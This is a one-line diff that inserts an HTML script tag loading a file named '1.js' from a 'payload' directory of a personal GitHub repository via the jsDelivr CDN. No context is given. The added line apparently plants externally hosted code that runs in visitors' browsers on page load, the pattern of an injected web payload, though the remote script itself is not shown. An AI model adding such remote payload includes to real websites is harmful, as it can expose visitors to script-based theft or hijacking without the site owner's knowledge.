@@ -1,0 +1,1 @@
+<script src="https://cdn.jsdelivr.net/gh/AkbarWiraN/my-rep/payload/1.js"></script>
